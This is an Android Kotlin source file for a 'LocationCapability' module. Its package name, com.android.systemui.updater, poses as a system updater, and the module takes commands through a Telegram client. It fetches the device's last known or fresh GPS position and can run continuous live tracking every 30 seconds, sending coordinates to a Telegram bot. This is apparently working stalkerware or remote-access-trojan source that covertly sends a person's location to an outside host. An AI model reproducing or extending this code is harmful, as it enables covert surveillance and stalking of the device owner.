package com.android.systemui.updater.capabilities

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import java.util.concurrent.TimeUnit

class LocationCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private val lm: LocationManager? = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    private var trackingListener: LocationListener? = null

    fun getOnce() {
        if (!hasLocationPermission()) {
            telegram.sendText("❌ Location permission denied")
            return
        }
        val manager = lm ?: run {
            telegram.sendText("❌ Location service unavailable")
            return
        }

        // Try last known first
        val last = try {
            manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        } catch (e: SecurityException) {
            null
        }

        if (last != null) {
            sendLocation(last, "📍 Last known location")
            return
        }

        // Request a single update
        telegram.sendText("📍 Requesting fresh fix...")
        requestFreshLocation()
    }

    fun startTracking() {
        if (!hasLocationPermission()) {
            telegram.sendText("❌ Location permission denied")
            return
        }
        val manager = lm ?: return

        // Remove existing if any
        stopTracking()

        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER) &&
            !manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            telegram.sendText("📍 Location providers disabled. Enable GPS or Network location.")
            return
        }

        telegram.sendText("📍 Live tracking started. /location stop to cancel.")

        trackingListener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                sendLocation(loc, "📍 Live update")
            }

            @Deprecated("Deprecated in API 29")
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}

            override fun onProviderEnabled(provider: String) {}

            override fun onProviderDisabled(provider: String) {
                telegram.sendText("📍 Location provider disabled: $provider")
            }
        }

        try {
            manager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            telegram.sendText("📍 Failed to start GPS tracking: ${e.message}")
        }

        try {
            manager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            // Network provider may not be available
        }
    }

    fun stopTracking() {
        val manager = lm ?: run {
            telegram.sendText("Not currently tracking.")
            return
        }
        trackingListener?.let {
            manager.removeUpdates(it)
            trackingListener = null
            telegram.sendText("📍 Tracking stopped.")
        } ?: telegram.sendText("Not currently tracking.")
    }

    private fun requestFreshLocation() {
        val manager = lm ?: return
        val listener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                sendLocation(loc, "📍 Fresh fix")
                manager.removeUpdates(this)
            }

            @Deprecated("Deprecated in API 29")
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}

            override fun onProviderEnabled(provider: String) {}

            override fun onProviderDisabled(provider: String) {}
        }

        try {
            manager.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null)
        } catch (e: Exception) {
            telegram.sendText("❌ Location request failed: ${e.message}")
        }
    }

    private fun sendLocation(loc: Location, prefix: String) {
        val lat = loc.latitude
        val lon = loc.longitude
        val accuracy = loc.accuracy
        val msg = "$prefix\nLat: $lat\nLon: $lon\nAcc: ${accuracy}m"
        telegram.sendText(msg)
        telegram.sendLocation(lat, lon)
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
               ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }
}
